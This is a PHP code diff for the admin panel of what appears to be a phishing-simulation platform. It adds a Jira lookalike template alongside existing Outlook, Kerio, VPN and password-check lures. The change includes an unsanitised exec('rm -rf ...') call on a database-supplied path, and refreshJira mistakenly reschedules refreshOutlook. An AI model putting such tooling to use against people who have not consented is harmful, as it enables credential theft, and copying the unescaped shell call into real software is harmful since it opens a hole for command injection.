@@ -174,6 +174,17 @@ header("Pragma: no-cache");
                     }
                 }
 
+                if($_POST['attack'] == "Jira"){
+                    $query = mysqli_query($link,"SELECT * FROM deployed WHERE attack_name = 'Jira' ");
+                    while($row = mysqli_fetch_array($query,MYSQLI_NUM)){
+                        $dir = $row[1];
+                        $delete_template = $dir.'/jira';
+                        exec ("rm -rf $delete_template");
+                        mysqli_query($link,"DELETE FROM deployed WHERE attack_name = 'Jira' ");
+                        mysqli_query($link,"DELETE FROM attacks_stats WHERE attack_name = 'Jira' ");
+                    }
+                }
+
                 if($_POST['attack'] == "checkpass"){
                     $query = mysqli_query($link,"SELECT * FROM deployed WHERE attack_name = 'Проверка пароля' ");
                     while($row = mysqli_fetch_array($query,MYSQLI_NUM)){
@@ -260,6 +271,7 @@ header("Pragma: no-cache");
                     
                     if($attack_name == "Kerio"){echo "<p><a href='https://$_SERVER[HTTP_HOST]/webmail/login/index.php' target='_blank''>Перейти к шаблону $attack_name</a></p>";}
                     if($attack_name == "Outlook"){echo "<p><a href='https://$_SERVER[HTTP_HOST]/owa' target='_blank'>$attack_name</a></p>";}
+                    if($attack_name == "Jira"){echo "<p><a href='https://$_SERVER[HTTP_HOST]/jira' target='_blank'>$attack_name</a></p>";}
                     if($attack_name == "Проверка пароля"){echo "<p><a href='https://$_SERVER[HTTP_HOST]/check/' target='_blank'>$attack_name</a></p>";$attack_name = "checkpass";}
                     if($attack_name == "Вебинар"){echo "<p><a href='https://$_SERVER[HTTP_HOST]/event/' target='_blank'>$attack_name</a></p>";$attack_name = "webinar";}
                     if($attack_name == "Обновление VPN"){echo "<p><a href='https://$_SERVER[HTTP_HOST]/openvpn/' target='_blank'>$attack_name</a></p>";;$attack_name = "vpn";}
@@ -308,7 +320,7 @@ header("Pragma: no-cache");
     <script src="../js/jquery.js"></script>
 
 <script type="text/javascript">
-    $("#but_Outlook, #but_Kerio, #but_Outlook, #but_checkpass, #but_webinar, #but_vpn, #but_antivirus, #but_LinkedIn, #but_pereraschet, #but_recalculation").click(function(e) {
+    $("#but_Outlook, #but_Kerio, #but_Outlook, #but_checkpass,#but_Jira, #but_webinar, #but_vpn, #but_antivirus, #but_LinkedIn, #but_pereraschet, #but_recalculation").click(function(e) {
         e.preventDefault();
         $.ajax({
             type: "POST",
@@ -336,6 +348,11 @@ $(document).ready(function(){
 
     function refreshOutlook(){
         $("#log_Outlook").load("../../../owa/auth/sender/send_log.txt", function(){
+           setTimeout(refreshOutlook, 2000);
+        });
+    }
+    function refreshJira(){
+        $("#log_Jira").load("../../../jira/sender/send_log.txt", function(){
            setTimeout(refreshOutlook, 2000);
         });
     }
